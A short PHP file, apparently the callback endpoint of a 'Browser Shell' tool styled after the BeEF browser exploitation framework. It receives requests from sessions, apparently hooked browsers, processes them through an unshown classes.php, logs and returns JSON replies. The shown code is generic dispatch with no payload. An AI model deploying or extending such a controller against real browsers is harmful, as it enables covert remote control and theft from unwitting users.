<?php

/**
 * Browser Shell PHP callback implementation. Slicker than BeeF?
 *
 * Relies only on PCRE PHP extension
 *
 * Feel free to implement a different language version, shouldn't take too long..
 *
 * (c) aybabtus 201206 - MIT License, PROVIDED "AS IS", NO WARRANTIES (but donations welcome)
 */


// Only disables setting NEW cookies, if it's are already set, client will send them.
define('DISABLE_COOKIES', false);

include_once("classes.php");

$request =  Request::receive();
$session = Session::find($request);
$response = Request::process($request, $session);

$json = json_encode($response);
if($json != "[]")
  Log::loga("Sending " . $json . " to " . $session->id);
Header("Pragma: no-cache");
Header("Expires: 0");
Header("Cache-Control: private");
print $json;
exit();
?>